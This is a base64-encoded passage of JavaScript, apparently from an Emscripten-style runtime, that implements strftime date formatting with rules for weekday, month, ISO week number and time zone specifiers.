G51bWVyaWMgc3ltYm9scy4NCiAgICAgICAgJyVPVic6ICclVicsICAgICAgICAgICAgICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSB3ZWVrIG51bWJlciBvZiB0aGUgeWVhciAoTW9uZGF5IGFzIHRoZSBmaXJzdCBkYXkgb2YgdGhlIHdlZWssIHJ1bGVzIGNvcnJlc3BvbmRpbmcgdG8gJVYgKSB1c2luZyB0aGUgbG9jYWxlJ3MgYWx0ZXJuYXRpdmUgbnVtZXJpYyBzeW1ib2xzLg0KICAgICAgICAnJU93JzogJyV3JywgICAgICAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIG51bWJlciBvZiB0aGUgd2Vla2RheSAoU3VuZGF5PTApIHVzaW5nIHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSBudW1lcmljIHN5bWJvbHMuDQogICAgICAgICclT1cnOiAnJVcnLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgd2VlayBudW1iZXIgb2YgdGhlIHllYXIgKE1vbmRheSBhcyB0aGUgZmlyc3QgZGF5IG9mIHRoZSB3ZWVrKSB1c2luZyB0aGUgbG9jYWxlJ3MgYWx0ZXJuYXRpdmUgbnVtZXJpYyBzeW1ib2xzLg0KICAgICAgICAnJU95JzogJyV5JywgICAgICAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIHllYXIgKG9mZnNldCBmcm9tICVDICkgdXNpbmcgdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlIG51bWVyaWMgc3ltYm9scy4NCiAgICAgIH07DQogICAgICBmb3IgKHZhciBydWxlIGluIEVYUEFOU0lPTl9SVUxFU18xKSB7DQogICAgICAgIHBhdHRlcm4gPSBwYXR0ZXJuLnJlcGxhY2UobmV3IFJlZ0V4cChydWxlLCAnZycpLCBFWFBBTlNJT05fUlVMRVNfMVtydWxlXSk7DQogICAgICB9DQogIA0KICAgICAgdmFyIFdFRUtEQVlTID0gWydTdW5kYXknLCAnTW9uZGF5JywgJ1R1ZXNkYXknLCAnV2VkbmVzZGF5JywgJ1RodXJzZGF5JywgJ0ZyaWRheScsICdTYXR1cmRheSddOw0KICAgICAgdmFyIE1PTlRIUyA9IFsnSmFudWFyeScsICdGZWJydWFyeScsICdNYXJjaCcsICdBcHJpbCcsICdNYXknLCAnSnVuZScsICdKdWx5JywgJ0F1Z3VzdCcsICdTZXB0ZW1iZXInLCAnT2N0b2JlcicsICdOb3ZlbWJlcicsICdEZWNlbWJlciddOw0KICANCiAgICAgIGZ1bmN0aW9uIGxlYWRpbmdTb21ldGhpbmcodmFsdWUsIGRpZ2l0cywgY2hhcmFjdGVyKSB7DQogICAgICAgIHZhciBzdHIgPSB0eXBlb2YgdmFsdWUgPT09ICdudW1iZXInID8gdmFsdWUudG9TdHJpbmcoKSA6ICh2YWx1ZSB8fCAnJyk7DQogICAgICAgIHdoaWxlIChzdHIubGVuZ3RoIDwgZGlnaXRzKSB7DQogICAgICAgICAgc3RyID0gY2hhcmFjdGVyWzBdK3N0cjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gc3RyOw0KICAgICAgfQ0KICANCiAgICAgIGZ1bmN0aW9uIGxlYWRpbmdOdWxscyh2YWx1ZSwgZGlnaXRzKSB7DQogICAgICAgIHJldHVybiBsZWFkaW5nU29tZXRoaW5nKHZhbHVlLCBkaWdpdHMsICcwJyk7DQogICAgICB9DQogIA0KICAgICAgZnVuY3Rpb24gY29tcGFyZUJ5RGF5KGRhdGUxLCBkYXRlMikgew0KICAgICAgICBmdW5jdGlvbiBzZ24odmFsdWUpIHsNCiAgICAgICAgICByZXR1cm4gdmFsdWUgPCAwID8gLTEgOiAodmFsdWUgPiAwID8gMSA6IDApOw0KICAgICAgICB9DQogIA0KICAgICAgICB2YXIgY29tcGFyZTsNCiAgICAgICAgaWYgKChjb21wYXJlID0gc2duKGRhdGUxLmdldEZ1bGxZZWFyKCktZGF0ZTIuZ2V0RnVsbFllYXIoKSkpID09PSAwKSB7DQogICAgICAgICAgaWYgKChjb21wYXJlID0gc2duKGRhdGUxLmdldE1vbnRoKCktZGF0ZTIuZ2V0TW9udGgoKSkpID09PSAwKSB7DQogICAgICAgICAgICBjb21wYXJlID0gc2duKGRhdGUxLmdldERhdGUoKS1kYXRlMi5nZXREYXRlKCkpOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gY29tcGFyZTsNCiAgICAgIH0NCiAgDQogICAgICBmdW5jdGlvbiBnZXRGaXJzdFdlZWtTdGFydERhdGUoamFuRm91cnRoKSB7DQogICAgICAgICAgc3dpdGNoIChqYW5Gb3VydGguZ2V0RGF5KCkpIHsNCiAgICAgICAgICAgIGNhc2UgMDogLy8gU3VuZGF5DQogICAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZShqYW5Gb3VydGguZ2V0RnVsbFllYXIoKS0xLCAxMSwgMjkpOw0KICAgICAgICAgICAgY2FzZSAxOiAvLyBNb25kYXkNCiAgICAgICAgICAgICAgcmV0dXJuIGphbkZvdXJ0aDsNCiAgICAgICAgICAgIGNhc2UgMjogLy8gVHVlc2RheQ0KICAgICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoamFuRm91cnRoLmdldEZ1bGxZZWFyKCksIDAsIDMpOw0KICAgICAgICAgICAgY2FzZSAzOiAvLyBXZWRuZXNkYXkNCiAgICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKGphbkZvdXJ0aC5nZXRGdWxsWWVhcigpLCAwLCAyKTsNCiAgICAgICAgICAgIGNhc2UgNDogLy8gVGh1cnNkYXkNCiAgICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKGphbkZvdXJ0aC5nZXRGdWxsWWVhcigpLCAwLCAxKTsNCiAgICAgICAgICAgIGNhc2UgNTogLy8gRnJpZGF5DQogICAgICAgICAgICAgIHJldHVybiBuZXcgRGF0ZShqYW5Gb3VydGguZ2V0RnVsbFllYXIoKS0xLCAxMSwgMzEpOw0KICAgICAgICAgICAgY2FzZSA2OiAvLyBTYXR1cmRheQ0KICAgICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoamFuRm91cnRoLmdldEZ1bGxZZWFyKCktMSwgMTEsIDMwKTsNCiAgICAgICAgICB9DQogICAgICB9DQogIA0KICAgICAgZnVuY3Rpb24gZ2V0V2Vla0Jhc2VkWWVhcihkYXRlKSB7DQogICAgICAgICAgdmFyIHRoaXNEYXRlID0gX19hZGREYXlzKG5ldyBEYXRlKGRhdGUudG1feWVhcisxOTAwLCAwLCAxKSwgZGF0ZS50bV95ZGF5KTsNCiAgDQogICAgICAgICAgdmFyIGphbkZvdXJ0aFRoaXNZZWFyID0gbmV3IERhdGUodGhpc0RhdGUuZ2V0RnVsbFllYXIoKSwgMCwgNCk7DQogICAgICAgICAgdmFyIGphbkZvdXJ0aE5leHRZZWFyID0gbmV3IERhdGUodGhpc0RhdGUuZ2V0RnVsbFllYXIoKSsxLCAwLCA0KTsNCiAgDQogICAgICAgICAgdmFyIGZpcnN0V2Vla1N0YXJ0VGhpc1llYXIgPSBnZXRGaXJzdFdlZWtTdGFydERhdGUoamFuRm91cnRoVGhpc1llYXIpOw0KICAgICAgICAgIHZhciBmaXJzdFdlZWtTdGFydE5leHRZZWFyID0gZ2V0Rmlyc3RXZWVrU3RhcnREYXRlKGphbkZvdXJ0aE5leHRZZWFyKTsNCiAgDQogICAgICAgICAgaWYgKGNvbXBhcmVCeURheShmaXJzdFdlZWtTdGFydFRoaXNZZWFyLCB0aGlzRGF0ZSkgPD0gMCkgew0KICAgICAgICAgICAgLy8gdGhpcyBkYXRlIGlzIGFmdGVyIHRoZSBzdGFydCBvZiB0aGUgZmlyc3Qgd2VlayBvZiB0aGlzIHllYXINCiAgICAgICAgICAgIGlmIChjb21wYXJlQnlEYXkoZmlyc3RXZWVrU3RhcnROZXh0WWVhciwgdGhpc0RhdGUpIDw9IDApIHsNCiAgICAgICAgICAgICAgcmV0dXJuIHRoaXNEYXRlLmdldEZ1bGxZZWFyKCkrMTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgIHJldHVybiB0aGlzRGF0ZS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gdGhpc0RhdGUuZ2V0RnVsbFllYXIoKS0xOw0KICAgICAgICAgIH0NCiAgICAgIH0NCiAgDQogICAgICB2YXIgRVhQQU5TSU9OX1JVTEVTXzIgPSB7DQogICAgICAgICclYSc6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gV0VFS0RBWVNbZGF0ZS50bV93ZGF5XS5zdWJzdHJpbmcoMCwzKTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVBJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIHJldHVybiBXRUVLREFZU1tkYXRlLnRtX3dkYXldOw0KICAgICAgICB9LA0KICAgICAgICAnJWInOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgcmV0dXJuIE1PTlRIU1tkYXRlLnRtX21vbl0uc3Vic3RyaW5nKDAsMyk7DQogICAgICAgIH0sDQogICAgICAgICclQic6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gTU9OVEhTW2RhdGUudG1fbW9uXTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVDJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIHZhciB5ZWFyID0gZGF0ZS50bV95ZWFyKzE5MDA7DQogICAgICAgICAgcmV0dXJuIGxlYWRpbmdOdWxscygoeWVhci8xMDApfDAsMik7DQogICAgICAgIH0sDQogICAgICAgICclZCc6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gbGVhZGluZ051bGxzKGRhdGUudG1fbWRheSwgMik7DQogICAgICAgIH0sDQogICAgICAgICclZSc6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gbGVhZGluZ1NvbWV0aGluZyhkYXRlLnRtX21kYXksIDIsICcgJyk7DQogICAgICAgIH0sDQogICAgICAgICclZyc6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICAvLyAlZywgJUcsIGFuZCAlViBnaXZlIHZhbHVlcyBhY2NvcmRpbmcgdG8gdGhlIElTTyA4NjAxOjIwMDAgc3RhbmRhcmQgd2Vlay1iYXNlZCB5ZWFyLg0KICAgICAgICAgIC8vIEluIHRoaXMgc3lzdGVtLCB3ZWVrcyBiZWdpbiBvbiBhIE1vbmRheSBhbmQgd2VlayAxIG9mIHRoZSB5ZWFyIGlzIHRoZSB3ZWVrIHRoYXQgaW5jbHVkZXMNCiAgICAgICAgICAvLyBKYW51YXJ5IDR0aCwgd2hpY2ggaXMgYWxzbyB0aGUgd2VlayB0aGF0IGluY2x1ZGVzIHRoZSBmaXJzdCBUaHVyc2RheSBvZiB0aGUgeWVhciwgYW5kDQogICAgICAgICAgLy8gaXMgYWxzbyB0aGUgZmlyc3Qgd2VlayB0aGF0IGNvbnRhaW5zIGF0IGxlYXN0IGZvdXIgZGF5cyBpbiB0aGUgeWVhci4NCiAgICAgICAgICAvLyBJZiB0aGUgZmlyc3QgTW9uZGF5IG9mIEphbnVhcnkgaXMgdGhlIDJuZCwgM3JkLCBvciA0dGgsIHRoZSBwcmVjZWRpbmcgZGF5cyBhcmUgcGFydCBvZg0KICAgICAgICAgIC8vIHRoZSBsYXN0IHdlZWsgb2YgdGhlIHByZWNlZGluZyB5ZWFyOyB0aHVzLCBmb3IgU2F0dXJkYXkgMm5kIEphbnVhcnkgMTk5OSwNCiAgICAgICAgICAvLyAlRyBpcyByZXBsYWNlZCBieSAxOTk4IGFuZCAlViBpcyByZXBsYWNlZCBieSA1My4gSWYgRGVjZW1iZXIgMjl0aCwgMzB0aCwNCiAgICAgICAgICAvLyBvciAzMXN0IGlzIGEgTW9uZGF5LCBpdCBhbmQgYW55IGZvbGxvd2luZyBkYXlzIGFyZSBwYXJ0IG9mIHdlZWsgMSBvZiB0aGUgZm9sbG93aW5nIHllYXIuDQogICAgICAgICAgLy8gVGh1cywgZm9yIFR1ZXNkYXkgMzB0aCBEZWNlbWJlciAxOTk3LCAlRyBpcyByZXBsYWNlZCBieSAxOTk4IGFuZCAlViBpcyByZXBsYWNlZCBieSAwMS4NCiAgDQogICAgICAgICAgcmV0dXJuIGdldFdlZWtCYXNlZFllYXIoZGF0ZSkudG9TdHJpbmcoKS5zdWJzdHJpbmcoMik7DQogICAgICAgIH0sDQogICAgICAgICclRyc6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gZ2V0V2Vla0Jhc2VkWWVhcihkYXRlKTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVIJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIHJldHVybiBsZWFkaW5nTnVsbHMoZGF0ZS50bV9ob3VyLCAyKTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVJJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIHZhciB0d2VsdmVIb3VyID0gZGF0ZS50bV9ob3VyOw0KICAgICAgICAgIGlmICh0d2VsdmVIb3VyID09IDApIHR3ZWx2ZUhvdXIgPSAxMjsNCiAgICAgICAgICBlbHNlIGlmICh0d2VsdmVIb3VyID4gMTIpIHR3ZWx2ZUhvdXIgLT0gMTI7DQogICAgICAgICAgcmV0dXJuIGxlYWRpbmdOdWxscyh0d2VsdmVIb3VyLCAyKTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVqJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIC8vIERheSBvZiB0aGUgeWVhciAoMDAxLTM2NikNCiAgICAgICAgICByZXR1cm4gbGVhZGluZ051bGxzKGRhdGUudG1fbWRheStfX2FycmF5U3VtKF9faXNMZWFwWWVhcihkYXRlLnRtX3llYXIrMTkwMCkgPyBfX01PTlRIX0RBWVNfTEVBUCA6IF9fTU9OVEhfREFZU19SRUdVTEFSLCBkYXRlLnRtX21vbi0xKSwgMyk7DQogICAgICAgIH0sDQogICAgICAgICclbSc6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gbGVhZGluZ051bGxzKGRhdGUudG1fbW9uKzEsIDIpOw0KICAgICAgICB9LA0KICAgICAgICAnJU0nOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgcmV0dXJuIGxlYWRpbmdOdWxscyhkYXRlLnRtX21pbiwgMik7DQogICAgICAgIH0sDQogICAgICAgICclbic6IGZ1bmN0aW9uKCkgew0KICAgICAgICAgIHJldHVybiAnXG4nOw0KICAgICAgICB9LA0KICAgICAgICAnJXAnOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgaWYgKGRhdGUudG1faG91ciA+PSAwICYmIGRhdGUudG1faG91ciA8IDEyKSB7DQogICAgICAgICAgICByZXR1cm4gJ0FNJzsNCiAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuICdQTSc7DQogICAgICAgICAgfQ0KICAgICAgICB9LA0KICAgICAgICAnJVMnOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgcmV0dXJuIGxlYWRpbmdOdWxscyhkYXRlLnRtX3NlYywgMik7DQogICAgICAgIH0sDQogICAgICAgICcldCc6IGZ1bmN0aW9uKCkgew0KICAgICAgICAgIHJldHVybiAnXHQnOw0KICAgICAgICB9LA0KICAgICAgICAnJXUnOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgcmV0dXJuIGRhdGUudG1fd2RheSB8fCA3Ow0KICAgICAgICB9LA0KICAgICAgICAnJVUnOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIHdlZWsgbnVtYmVyIG9mIHRoZSB5ZWFyIGFzIGEgZGVjaW1hbCBudW1iZXIgWzAwLDUzXS4NCiAgICAgICAgICAvLyBUaGUgZmlyc3QgU3VuZGF5IG9mIEphbnVhcnkgaXMgdGhlIGZpcnN0IGRheSBvZiB3ZWVrIDE7DQogICAgICAgICAgLy8gZGF5cyBpbiB0aGUgbmV3IHllYXIgYmVmb3JlIHRoaXMgYXJlIGluIHdlZWsgMC4gWyB0bV95ZWFyLCB0bV93ZGF5LCB0bV95ZGF5XQ0KICAgICAgICAgIHZhciBqYW5GaXJzdCA9IG5ldyBEYXRlKGRhdGUudG1feWVhcisxOTAwLCAwLCAxKTsNCiAgICAgICAgICB2YXIgZmlyc3RTdW5kYXkgPSBqYW5GaXJzdC5nZXREYXkoKSA9PT0gMCA/IGphbkZpcnN0IDogX19hZGREYXlzKGphbkZpcnN0LCA3LWphbkZpcnN0LmdldERheSgpKTsNCiAgICAgICAgICB2YXIgZW5kRGF0ZSA9IG5ldyBEYXRlKGRhdGUudG1feWVhcisxOTAwLCBkYXRlLnRtX21vbiwgZGF0ZS50bV9tZGF5KTsNCiAgDQogICAgICAgICAgLy8gaXMgdGFyZ2V0IGRhdGUgYWZ0ZXIgdGhlIGZpcnN0IFN1bmRheT8NCiAgICAgICAgICBpZiAoY29tcGFyZUJ5RGF5KGZpcnN0U3VuZGF5LCBlbmREYXRlKSA8IDApIHsNCiAgICAgICAgICAgIC8vIGNhbGN1bGF0ZSBkaWZmZXJlbmNlIGluIGRheXMgYmV0d2VlbiBmaXJzdCBTdW5kYXkgYW5kIGVuZERhdGUNCiAgICAgICAgICAgIHZhciBmZWJydWFyeUZpcnN0VW50aWxFbmRNb250aCA9IF9fYXJyYXlTdW0oX19pc0xlYXBZZWFyKGVuZERhdGUuZ2V0RnVsbFllYXIoKSkgPyBfX01PTlRIX0RBWVNfTEVBUCA6IF9fTU9OVEhfREFZU19SRUdVTEFSLCBlbmREYXRlLmdldE1vbnRoKCktMSktMzE7DQogICAgICAgICAgICB2YXIgZmlyc3RTdW5kYXlVbnRpbEVuZEphbnVhcnkgPSAzMS1maXJzdFN1bmRheS5nZXREYXRlKCk7DQogICAgICAgICAgICB2YXIgZGF5cyA9IGZpcnN0U3VuZGF5VW50aWxFbmRKYW51YXJ5K2ZlYnJ1YXJ5Rmlyc3RVbnRpbEVuZE1vbnRoK2VuZERhdGUuZ2V0RGF0ZSgpOw0KICAgICAgICAgICAgcmV0dXJuIGxlYWRpbmdOdWxscyhNYXRoLmNlaWwoZGF5cy83KSwgMik7DQogICAgICAgICAgfQ0KICANCiAgICAgICAgICByZXR1cm4gY29tcGFyZUJ5RGF5KGZpcnN0U3VuZGF5LCBqYW5GaXJzdCkgPT09IDAgPyAnMDEnOiAnMDAnOw0KICAgICAgICB9LA0KICAgICAgICAnJVYnOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIHdlZWsgbnVtYmVyIG9mIHRoZSB5ZWFyIChNb25kYXkgYXMgdGhlIGZpcnN0IGRheSBvZiB0aGUgd2VlaykNCiAgICAgICAgICAvLyBhcyBhIGRlY2ltYWwgbnVtYmVyIFswMSw1M10uIElmIHRoZSB3ZWVrIGNvbnRhaW5pbmcgMSBKYW51YXJ5IGhhcyBmb3VyDQogICAgICAgICAgLy8gb3IgbW9yZSBkYXlzIGluIHRoZSBuZXcgeWVhciwgdGhlbiBpdCBpcyBjb25zaWRlcmVkIHdlZWsgMS4NCiAgICAgICAgICAvLyBPdGhlcndpc2UsIGl0IGlzIHRoZSBsYXN0IHdlZWsgb2YgdGhlIHByZXZpb3VzIHllYXIsIGFuZCB0aGUgbmV4dCB3ZWVrIGlzIHdlZWsgMS4NCiAgICAgICAgICAvLyBCb3RoIEphbnVhcnkgNHRoIGFuZCB0aGUgZmlyc3QgVGh1cnNkYXkgb2YgSmFudWFyeSBhcmUgYWx3YXlzIGluIHdlZWsgMS4gWyB0bV95ZWFyLCB0bV93ZGF5LCB0bV95ZGF5XQ0KICAgICAgICAgIHZhciBqYW5Gb3VydGhUaGlzWWVhciA9IG5ldyBEYXRlKGRhdGUudG1feWVhcisxOTAwLCAwLCA0KTsNCiAgICAgICAgICB2YXIgamFuRm91cnRoTmV4dFllYXIgPSBuZXcgRGF0ZShkYXRlLnRtX3llYXIrMTkwMSwgMCwgNCk7DQogIA0KICAgICAgICAgIHZhciBmaXJzdFdlZWtTdGFydFRoaXNZZWFyID0gZ2V0Rmlyc3RXZWVrU3RhcnREYXRlKGphbkZvdXJ0aFRoaXNZZWFyKTsNCiAgICAgICAgICB2YXIgZmlyc3RXZWVrU3RhcnROZXh0WWVhciA9IGdldEZpcnN0V2Vla1N0YXJ0RGF0ZShqYW5Gb3VydGhOZXh0WWVhcik7DQogIA0KICAgICAgICAgIHZhciBlbmREYXRlID0gX19hZGREYXlzKG5ldyBEYXRlKGRhdGUudG1feWVhcisxOTAwLCAwLCAxKSwgZGF0ZS50bV95ZGF5KTsNCiAgDQogICAgICAgICAgaWYgKGNvbXBhcmVCeURheShlbmREYXRlLCBmaXJzdFdlZWtTdGFydFRoaXNZZWFyKSA8IDApIHsNCiAgICAgICAgICAgIC8vIGlmIGdpdmVuIGRhdGUgaXMgYmVmb3JlIHRoaXMgeWVhcnMgZmlyc3Qgd2VlaywgdGhlbiBpdCBiZWxvbmdzIHRvIHRoZSA1M3JkIHdlZWsgb2YgbGFzdCB5ZWFyDQogICAgICAgICAgICByZXR1cm4gJzUzJzsNCiAgICAgICAgICB9DQogIA0KICAgICAgICAgIGlmIChjb21wYXJlQnlEYXkoZmlyc3RXZWVrU3RhcnROZXh0WWVhciwgZW5kRGF0ZSkgPD0gMCkgew0KICAgICAgICAgICAgLy8gaWYgZ2l2ZW4gZGF0ZSBpcyBhZnRlciBuZXh0IHllYXJzIGZpcnN0IHdlZWssIHRoZW4gaXQgYmVsb25ncyB0byB0aGUgMDF0aCB3ZWVrIG9mIG5leHQgeWVhcg0KICAgICAgICAgICAgcmV0dXJuICcwMSc7DQogICAgICAgICAgfQ0KICANCiAgICAgICAgICAvLyBnaXZlbiBkYXRlIGlzIGluIGJldHdlZW4gQ1cgMDEuLjUzIG9mIHRoaXMgY2FsZW5kYXIgeWVhcg0KICAgICAgICAgIHZhciBkYXlzRGlmZmVyZW5jZTsNCiAgICAgICAgICBpZiAoZmlyc3RXZWVrU3RhcnRUaGlzWWVhci5nZXRGdWxsWWVhcigpIDwgZGF0ZS50bV95ZWFyKzE5MDApIHsNCiAgICAgICAgICAgIC8vIGZpcnN0IENXIG9mIHRoaXMgeWVhciBzdGFydHMgbGFzdCB5ZWFyDQogICAgICAgICAgICBkYXlzRGlmZmVyZW5jZSA9IGRhdGUudG1feWRheSszMi1maXJzdFdlZWtTdGFydFRoaXNZZWFyLmdldERhdGUoKQ0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAvLyBmaXJzdCBDVyBvZiB0aGlzIHllYXIgc3RhcnRzIHRoaXMgeWVhcg0KICAgICAgICAgICAgZGF5c0RpZmZlcmVuY2UgPSBkYXRlLnRtX3lkYXkrMS1maXJzdFdlZWtTdGFydFRoaXNZZWFyLmdldERhdGUoKTsNCiAgICAgICAgICB9DQogICAgICAgICAgcmV0dXJuIGxlYWRpbmdOdWxscyhNYXRoLmNlaWwoZGF5c0RpZmZlcmVuY2UvNyksIDIpOw0KICAgICAgICB9LA0KICAgICAgICAnJXcnOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgcmV0dXJuIGRhdGUudG1fd2RheTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVXJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSB3ZWVrIG51bWJlciBvZiB0aGUgeWVhciBhcyBhIGRlY2ltYWwgbnVtYmVyIFswMCw1M10uDQogICAgICAgICAgLy8gVGhlIGZpcnN0IE1vbmRheSBvZiBKYW51YXJ5IGlzIHRoZSBmaXJzdCBkYXkgb2Ygd2VlayAxOw0KICAgICAgICAgIC8vIGRheXMgaW4gdGhlIG5ldyB5ZWFyIGJlZm9yZSB0aGlzIGFyZSBpbiB3ZWVrIDAuIFsgdG1feWVhciwgdG1fd2RheSwgdG1feWRheV0NCiAgICAgICAgICB2YXIgamFuRmlyc3QgPSBuZXcgRGF0ZShkYXRlLnRtX3llYXIsIDAsIDEpOw0KICAgICAgICAgIHZhciBmaXJzdE1vbmRheSA9IGphbkZpcnN0LmdldERheSgpID09PSAxID8gamFuRmlyc3QgOiBfX2FkZERheXMoamFuRmlyc3QsIGphbkZpcnN0LmdldERheSgpID09PSAwID8gMSA6IDctamFuRmlyc3QuZ2V0RGF5KCkrMSk7DQogICAgICAgICAgdmFyIGVuZERhdGUgPSBuZXcgRGF0ZShkYXRlLnRtX3llYXIrMTkwMCwgZGF0ZS50bV9tb24sIGRhdGUudG1fbWRheSk7DQogIA0KICAgICAgICAgIC8vIGlzIHRhcmdldCBkYXRlIGFmdGVyIHRoZSBmaXJzdCBNb25kYXk/DQogICAgICAgICAgaWYgKGNvbXBhcmVCeURheShmaXJzdE1vbmRheSwgZW5kRGF0ZSkgPCAwKSB7DQogICAgICAgICAgICB2YXIgZmVicnVhcnlGaXJzdFVudGlsRW5kTW9udGggPSBfX2FycmF5U3VtKF9faXNMZWFwWWVhcihlbmREYXRlLmdldEZ1bGxZZWFyKCkpID8gX19NT05USF9EQVlTX0xFQVAgOiBfX01PTlRIX0RBWVNfUkVHVUxBUiwgZW5kRGF0ZS5nZXRNb250aCgpLTEpLTMxOw0KICAgICAgICAgICAgdmFyIGZpcnN0TW9uZGF5VW50aWxFbmRKYW51YXJ5ID0gMzEtZmlyc3RNb25kYXkuZ2V0RGF0ZSgpOw0KICAgICAgICAgICAgdmFyIGRheXMgPSBmaXJzdE1vbmRheVVudGlsRW5kSmFudWFyeStmZWJydWFyeUZpcnN0VW50aWxFbmRNb250aCtlbmREYXRlLmdldERhdGUoKTsNCiAgICAgICAgICAgIHJldHVybiBsZWFkaW5nTnVsbHMoTWF0aC5jZWlsKGRheXMvNyksIDIpOw0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gY29tcGFyZUJ5RGF5KGZpcnN0TW9uZGF5LCBqYW5GaXJzdCkgPT09IDAgPyAnMDEnOiAnMDAnOw0KICAgICAgICB9LA0KICAgICAgICAnJXknOiBmdW5jdGlvbihkYXRlKSB7DQogICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIGxhc3QgdHdvIGRpZ2l0cyBvZiB0aGUgeWVhciBhcyBhIGRlY2ltYWwgbnVtYmVyIFswMCw5OV0uIFsgdG1feWVhcl0NCiAgICAgICAgICByZXR1cm4gKGRhdGUudG1feWVhcisxOTAwKS50b1N0cmluZygpLnN1YnN0cmluZygyKTsNCiAgICAgICAgfSwNCiAgICAgICAgJyVZJzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSB5ZWFyIGFzIGEgZGVjaW1hbCBudW1iZXIgKGZvciBleGFtcGxlLCAxOTk3KS4gWyB0bV95ZWFyXQ0KICAgICAgICAgIHJldHVybiBkYXRlLnRtX3llYXIrMTkwMDsNCiAgICAgICAgfSwNCiAgICAgICAgJyV6JzogZnVuY3Rpb24oZGF0ZSkgew0KICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSBvZmZzZXQgZnJvbSBVVEMgaW4gdGhlIElTTyA4NjAxOjIwMDAgc3RhbmRhcmQgZm9ybWF0ICggK2hobW0gb3IgLWhobW0gKS4NCiAgICAgICAgICAvLyBGb3IgZXhhbXBsZSwgIi0wNDMwIiBtZWFucyA0IGhvdXJzIDMwIG1pbnV0ZXMgYmVoaW5kIFVUQyAod2VzdCBvZiBHcmVlbndpY2gpLg0KICAgICAgICAgIHZhciBvZmYgPSBkYXRlLnRtX2dtdG9mZjsNCiAgICAgICAgICB2YXIgYWhlYWQgPSBvZmYgPj0gMDsNCiAgICAgICAgICBvZmYgPSBNYXRoLmFicyhvZmYpIC8gNjA7DQogICAgICAgICAgLy8gY29udmVydCBmcm9tIG1pbnV0ZXMgaW50byBoaG1tIGZvcm1hdCAod2hpY2ggbWVhbnMgNjAgbWludXRlcyA9IDEwMCB1bml0cykNCiAgICAgICAgICBvZmYgPSAob2ZmIC8gNjApKjEwMCArIChvZmYgJSA2MCk7DQogICAgICAgICAgcmV0dXJuIChhaGVhZCA/ICcrJyA6ICctJykgKyBTdHJpbmcoIjAwMDAiICsgb2ZmKS5zbGljZSgtNCk7DQogICAgICAgIH0sDQogICAgICAgICclWic6IGZ1bmN0aW9uKGRhdGUpIHsNCiAgICAgICAgICByZXR1cm4gZGF0ZS50bV96b25lOw0KICAgICAgICB9LA0KICAgICAgICAnJSUnOiBmdW5jdGlvbigpIHsNCiAgICAgICAgICByZXR1cm4gJyUnOw0KICAgICAgICB9DQogICAgICB9Ow0KICAgICAgZm9yICh2YXIgcnVsZSBpbiBFWFBBTlNJT05fUlVMRVNfMikgew0KICAgICAgICBpZiAocGF0dGVybi5pbmRleE9mKHJ1bGUpID49IDApIHsNCiAgICAgICAgICBwYXR0ZXJuID0gcGF0dGVybi5yZXBsYWNlKG5ldyBSZWdFeHAocnVsZSwgJ2cnKSwgRVhQQU5TSU9OX1JVTEVTXzJbcnVsZV0oZGF0ZSkpOw0KICAgICAgICB9DQogICAgICB9DQogIA0KICAgICAgdmFyIGJ5dGVzID0gaW50QXJyYXlGcm9tU3RyaW5nKHBhdHRlcm4sIGZhbHNlKTsNCiAgICAgIGlmIChieXR